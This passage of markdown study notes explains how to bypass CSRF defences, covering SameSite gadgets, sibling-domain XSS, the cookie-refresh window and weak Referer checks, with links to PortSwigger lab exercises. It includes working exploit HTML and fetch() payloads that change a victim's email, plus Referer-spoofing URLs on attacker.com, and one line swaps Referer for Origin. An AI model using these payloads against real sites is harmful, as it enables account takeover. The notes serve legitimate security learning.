>[!note] A _gadget_, in this context, is any pre-existing functionality on the target site that you can repurpose to generate the request you actually want. If no such gadget exists, [[XSS]] can be used to create one from scratch.

>[!example]+ Example: Open redirect as a gadget
>
> - Suppose the target website, `example.com`, has a DOM-based open redirect:
> 
> ```JS
> let target = new URLSearchParams(location.search).get('url');
> window.location.href = target;
> ```
> 
> - If the application accepts `GET` on state-changing requests, even with `SameSite=Strict`, you can exploit CSRF by making the victim navigate to:
> 
> ```
> https://example.com/?url=https://example.com/my-account/change-email?email=pwned%40example.com
> ```
> 
> - The victim's browser is kept inside `example.com` the entire time; the state-changing request to `example.com` is triggered via a redirect from `example.com` — same-site.
> 
> - The exploit would look like:
> 
> ```html
> <script>
> 	window.location = "https://example.com/?url=https://example.com/my-account/change-email?email=pwned%40example.com"
> </script>
> ```

> [!important] The redirect must be **client-side** (JavaScript-driven), not server-side. A server-side `3xx` redirect is initiated by the _server_, but the browser still sees that the _triggering navigation itself_ originated cross-site, so it withholds the cookie on the follow-up request. A client-side gadget makes the request look like an ordinary top-level navigation.

>[!bug]+ Labs
>- [[🛠️ CSRF labs#8. SameSite Strict bypass via client-side redirect]]
#### Bypassing `SameSite` restrictions via vulnerable sibling domains

>[!important]+ Cross-*origin* is not the same as cross-*site*. A cross-origin request can be same-site.
>>[!example]
>> `https://app.example.com` and `https://api.example.com` are different origins but the same site, and `SameSite=Strict` cookies are still attached on requests between them.

>[!important] Cookies are included in same-site requests even when they are cross-origin — even with `SameSite=Strict`.

![[origin_and_site.svg]]

- If you can get arbitrary JavaScript execution on **any subdomain that shares the same eTLD+1 as the target application**, you can **bypass `SameSite` cookie protection** (since any requests from that subdomain to the target will be considered same-site).

>[!example]+
> - On the target application, the `session` cookie has `SameSite=Strict`:
> 
> ```http
> Set-Cookie: session=abc123; SameSite=Strict
> ```
> - You find an XSS vulnerability on a sibling domain, `blog.example.com`, so you can bypass `SameSite=strict` protection:
> 
> ```js
> fetch("https://example.com/my-account/change-email", {
>   method: "POST",
>   credentials: "include",
>   headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
>   body: "email=pwned%40example.com"
> });
> ```
> 
> - Since this request originates from `https://blog.example.com` to `https://example.com`, it is **same-site**, so the browser includes the session cookie in the request.

- Example exploit:

```javascript
fetch("https://example.com/my-account/change-email", {
  method: "POST",
  credentials: "include",
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: "email=pwned%40example.com"
});
```

>[!important]+ `credentials: 'include'` is required, otherwise `fetch()` won't attach cookies to a cross-origin request (even though it's same-site).

> [!note] This is also the root cause behind **Cross-Site WebSocket Hijacking (CSWSH)** — see [[🛠️ WebSocket vulnerabilities#CSWSH]].

>[!bug]+ Labs
>- [[🛠️ CSRF labs#9. SameSite Strict bypass via sibling domain|9. SameSite Strict bypass via sibling domain]]

#### Bypassing `SameSite` Lax restrictions with newly issued cookies

- If the application doesn't explicitly set `SameSite` attribute when issuing a cookie, most browsers apply the implicit `Lax` default (see [[#Default browser behavior]]).
- However, in this case (when `SameSite=Lax` is set implicitly), the **restrictions are not enforced for the first `120` seconds on top-level `POST` requests**. This is implemented to avoid breaking Single Sign-On (SSO) mechanisms.

>[!important]  The grace window only applies to cookies issued **without** an explicit `SameSite` attribute. Cookies that set `SameSite=Lax` explicitly do not get the `120`-second exception.

- This two-minute window can sometimes be abused to bypass `SameSite` protection. 
- Exploitation requires a gadget that renews the session cookie immediately followed by a CSRF attack. A gadget can be anything that forces a fresh login or session renewal. 

>[!example]+
> ```html
> <form method="POST" action="https://0a5600ff04720663816789aa006e00d7.web-security-academy.net/my-account/change-email">
>     <input type="hidden" name="email" value="pwned@portswigger.net">
> </form>
> <p>Click anywhere on the page</p>
> <script>
>     window.onclick = () => {
>         window.open('https://0a5600ff04720663816789aa006e00d7.web-security-academy.net/social-login');
>         setTimeout(changeEmail, 5000);
>     }
> 
>     function changeEmail() {
>         document.forms[0].submit();
>     }
> </script>
> ```

- Example exploit:

```html
<!-- step 1: force (or wait for) a cookie refresh on the target -->
<iframe src="https://example.com/refresh-session" style="display:none"></iframe>

<!-- step 2: immediately fire the forged POST while the cookie is still "new" -->
<form id="csrf" action="https://example.com/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="pwned@example.com">
</form>
<script>
  setTimeout(() => document.getElementById('csrf').submit(), 500);
</script>
```

>[!bug]+ 
>- [[🛠️ CSRF labs#10. SameSite Lax bypass via cookie refresh|10. SameSite Lax bypass via cookie refresh]]

## `Referer`- and `Origin`-based defenses

### `Referer` and `Origin`

>The [`Referer` header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer) carries the full URL — scheme, host, port, path, and query string, but never fragments or embedded credentials — of the page that initiated the current request. 

- `Referer` is set automatically by the browser on navigation, form submission, and most resource loads, but this presence or accuracy are not guaranteed.
- The header can be suppressed by [`Referrer-Policy`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy).

>[!interesting] `Referer`'s spelling is a documented historical typo in the original HTTP specification (it should be "`Referrer`") that's been preserved for backward compatibility ever since.


>The [`Origin` header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Origin) carries the **scheme, hostname, and port** of the page that initiated the request — but never URL path or query string.

- Unlike `Referer`, `Origin` is sent specifically on cross-origin requests, every non-`GET` request, and every [[🛠️ CORS]] preflight.

>[!note] `Referer` is primarily used for analytics, logging, and broken link detection; `Referer` is designed for [[🛠️ CORS]] validation and security checks.
### Bypassing `Referer`-based CSRF defenses

- Some applications attempt to defend against CSRF attacks by validating the `Referer` HTTP header in requests. The header is, however, subject to spoofing.
- The two most commonly-exploited flaws in `Referer` validation:
	- **Validation of `Referer` depends on header being present**
	- **Validation of `Referer` can be circumvented**

>[!note] For `Origin` bypasses, see [[🛠️ CORS#Flawed Origin validation]].
#### Validation of `Referer` depends on header being present

>[!bug] The application validates `Referer` if it's present but skips validation where it's absent.

- To bypass validation, you can suppress the `Referer` header in a state-changing cross-site request by adding a [`Referer-Policy`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy) meta tag to the exploit page:

```html
<meta name="referrer" content="no-referrer" />
```

- Example exploit:

```html
<html>
	<head>
		<!-- suppress Referer for all requests from this page -->
		<meta name="referrer" content="no-referrer" />
	</head>
    <body>
        <form action="https://example.com/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@example.com" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

- Alternatively, you can configure `Referrer-Policy: no-referrer` HTTP  response header on the exploit page to achieve the same result.

>[!bug]+ Labs
>- [[🛠️ CSRF labs#11. CSRF where Referer validation depends on header being present|11. CSRF where Referer validation depends on header being present]]

#### Validation of `Referer` can be circumvented

>[!bug] The server validates `Referer` using a weak substring match in a way that can be bypassed.

- For example, the application may only check that the trusted domain appears *somewhere* in the `Referer` value — rather than parsing the URL and comparing the actual host.
- Depending on how `Referer`'s URL is parsed and validated, different payloads may work:

```powershell
https://example.com.attacker.com    # resister a subdomain on your controlled domain
https://attacker.com/?example.com   # submit the domain as a URL parameter
https://attacker.com?%00example.com # null byte
```

>[!note] See [`URL validation bypass cheat sheet — PortSwigger Web Security Academy`](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet).


>[!important] Many browsers now strip the query string from the `Referer` header by default — to avoid leaking sensitive information this way.
>- You can override this behavior by including `Referrer-Policy: unsafe-url` header in the response.

>[!bug]+ Labs
>- [[🛠️ CSRF labs#12. CSRF with broken Referer validation|12. CSRF with broken Referer validation]]
## References

- [`Cross-site request forgery (CSRF) — PortSwigger Web Security Academy`](https://portswigger.net/web-security/csrf)
- [`Cross-Site Request Forgery — PayloadsAllTheThings`](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Cross-Site%20Request%20Forgery/README.md)
- [`Cross Site Request Forgery (CSRF) — OWASP`](https://owasp.org/www-community/attacks/csrf)
- [`CSRF (Cross Site Request Forgery) — HackTricks`](https://hacktricks.wiki/en/pentesting-web/csrf-cross-site-request-forgery.html)

- [`Exploring the SameSite cookie atttribute for preventing CSRF — Simon Willison's Weblog`](https://simonwillison.net/2021/Aug/3/samesite/)
- [`What is Cross-Site Request Forgery (CSRF)? — StackHawk`](https://www.stackhawk.com/blog/what-is-cross-site-request-forgery-csrf/) 
- [`What is cross-site request forgery? — invicti`](https://www.invicti.com/blog/web-security/csrf-cross-site-request-forgery/)
- [`https://www.imperva.com/learn/application-security/csrf-cross-site-request-forgery/ — imperva`](https://www.imperva.com/learn/application-security/csrf-cross-site-request-forgery/)

- [`Cypress CSRF Form Testing — Gleb Bahmutov`](https://glebbahmutov.com/blog/csrf-testing/)
- [`Account Take Over Vulnerability in Google acquisition, Framebit — Hassan Khan, Medium`](https://infosecwriteups.com/account-take-over-vulnerability-in-google-acquisition-famebit-e93b1a0a7af9)

